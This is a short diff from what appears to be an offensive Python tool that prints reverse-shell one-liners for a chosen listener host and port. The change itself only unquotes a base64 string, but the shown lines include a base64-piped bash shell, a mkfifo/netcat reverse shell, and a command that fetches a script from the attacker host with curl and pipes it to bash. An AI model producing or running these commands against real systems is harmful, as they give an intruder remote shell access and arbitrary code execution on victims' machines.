@@ -71,7 +71,7 @@ def main():
     bash_shell_b64 = base64.b64encode(bash_shell.encode()).decode()
     print_separator("BASH", "Bash")
     print(f"bash -c \"{bash_shell}\"\n")
-    print(f"echo '{bash_shell_b64}' | base64 -d | bash\n")
+    print(f"echo {bash_shell_b64} | base64 -d | bash\n")
     print(f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {lhost} {lport} >/tmp/f\n")
     print(f"[LOCAL]  echo '{bash_shell}' > shell.sh")
     print(f"[REMOTE] curl {lhost}/shell.sh | /bin/bash\n")
